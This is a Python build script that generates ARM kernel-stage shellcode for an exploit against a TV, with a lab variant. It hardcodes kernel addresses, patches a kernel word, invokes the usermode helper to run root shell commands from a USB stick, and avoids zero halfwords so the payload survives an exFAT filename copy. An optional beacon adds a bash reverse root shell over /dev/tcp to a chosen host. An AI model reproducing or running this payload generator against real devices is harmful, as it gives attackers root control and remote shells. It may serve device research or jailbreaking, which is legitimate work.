#!/usr/bin/env python3
"""Build the fixed-cave kernel stage for lab or TV.

Uses nix-provided arm-none-eabi-as/objcopy. The payload is position-independent
inside the fixed core cave, patches UEP (TV profile), and launches the signed
/bin/bash with a command that finds and runs stage1.sh from USB p2.

Every u16 is checked: a 0x0000 halfword would terminate that 30-byte exFAT
name fragment before the remaining bytes were copied.
"""
import argparse
import os
import shutil
import struct
import subprocess
import tempfile

PROFILES = {
    "lab": {
        "coherent": 0xC001CFC0,
        "umh": 0xC003789C,
        "park": 0xC04CB870,
        "uep": None,
        "path": "/bin/sh",
        "command": "echo UMH-PAYLOAD-OK >/dev/console",
    },
    "lab-dropbear": {
        "coherent": 0xC001CFC0,
        "umh": 0xC003789C,
        "park": 0xC04CB870,
        "uep": None,
        "path": "/bin/sh",
        "command": "exec /bin/sh /mnt/p2/stage1.sh",
    },
    "tv": {
        "coherent": 0xC001CEE8,
        "umh": 0xC003A2E4,
        "park": 0xC051EDCC,
        "uep": 0xC01D49B8,
        "path": "/bin/bash",
        # Physical-TV observation: sda2 mounts exactly here. p1 may fire
        # first, so wait until p2 appears and then replace this shell.
        "command": (
            "while [ ! -r /opt/media/USBDriveA2/stage1.sh ];do /bin/sleep 1;done;"
            "export P2=/opt/media/USBDriveA2;"
            "/bin/cat $P2/stage1.sh|/bin/bash -s"
        ),
    },
}


def emit(profile, beacon=None):
    p = dict(PROFILES[profile])
    if beacon:
        host, port = beacon.rsplit(":", 1)
        if not port.isdigit() or any(c not in "0123456789abcdefABCDEF:." for c in host):
            raise SystemExit("--beacon must be a numeric IP address and port")
        p["command"] = (
            f"exec 9<>/dev/tcp/{host}/{port};"
            "echo KERNEL-STAGE-OK >&9;"
            "/bin/bash -i <&9 >&9 2>&9 & exec 9>&-;" + p["command"]
        )
    patch = ""
    if p["uep"] is not None:
        patch = f"""
    ldr     r0, uep_addr
    ldr     r1, uep_word0
    str     r1, [r0]
    ldr     r1, uep_word1
    str     r1, [r0, #4]
    add     r1, r0, #8
    ldr     r3, coherent_addr
    blx     r3
"""
    return f""".syntax unified
.arm
.global _start
.section .text
_start:
{patch}
    ldr     r4, saved_ip_addr
    ldr     sp, [r4]
    sub     sp, sp, #256
    adr     r0, path
    str     r0, [sp, #16]
    adr     r4, arg_c
    str     r4, [sp, #20]
    adr     r4, command
    str     r4, [sp, #24]
    mov     r4, #1
    sub     r4, r4, #1
    str     r4, [sp, #28]
    add     r1, sp, #16
    mov     r2, #1
    sub     r2, r2, #1
    mov     r3, #1
    sub     r3, r3, #1
    ldr     r4, umh_addr
    blx     r4
1:  movw    r0, #0xffff
    movt    r0, #0x7fff
    ldr     r4, park_addr
    blx     r4
    b       1b

path:       .asciz "{p['path']}"
arg_c:      .asciz "-c"
command:    .asciz "{p['command']}"
    .balign 4, 0x41
coherent_addr: .word 0x{p['coherent']:08x}
umh_addr:      .word 0x{p['umh']:08x}
park_addr:     .word 0x{p['park']:08x}
saved_ip_addr: .word 0xc0008d00
""" + (f"""uep_addr:       .word 0x{p['uep']:08x}
uep_word0:      .word 0xe3a00002
uep_word1:      .word 0xe12fff1e
""" if p["uep"] is not None else "")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--profile", choices=PROFILES, required=True)
    ap.add_argument("--d", action="store_true")
    ap.add_argument("--out", required=True)
    ap.add_argument("--beacon", help="optional targeted TCP root shell at HOST:PORT")
    ap.add_argument("--pad-to", type=int, default=0,
                    help="pad with nonzero bytes to exercise a deeper copy")
    a = ap.parse_args()
    as_bin = shutil.which("arm-none-eabi-as")
    objcopy = shutil.which("arm-none-eabi-objcopy")
    if not as_bin or not objcopy:
        raise SystemExit("arm-none-eabi-as/objcopy missing; run inside nix develop")
    with tempfile.TemporaryDirectory(prefix="kernel-stage-") as td:
        src, obj = os.path.join(td, "stage.S"), os.path.join(td, "stage.o")
        open(src, "w").write(emit(a.profile, a.beacon))
        subprocess.run([as_bin, "-march=armv7-a", src, "-o", obj], check=True)
        subprocess.run([objcopy, "-O", "binary", "-j", ".text", obj, a.out], check=True)
        if a.d:
            subprocess.run([shutil.which("arm-none-eabi-objdump"), "-dr", obj], check=True)
    blob = open(a.out, "rb").read()
    if a.pad_to and len(blob) < a.pad_to:
        blob += b"AA" * ((a.pad_to - len(blob) + 1) // 2)
        blob = blob[:a.pad_to]
        if len(blob) & 1:
            blob += b"A"
        open(a.out, "wb").write(blob)
    zeros = [i for i in range(0, len(blob), 2)
             if struct.unpack_from("<H", blob, i)[0] == 0]
    if zeros:
        raise SystemExit(
            f"generated payload contains zero halfwords at {[hex(x) for x in zeros]}")
    print(f"wrote {a.out}: {len(blob)} bytes, zero_halfwords=[]")

if __name__ == "__main__":
    main()
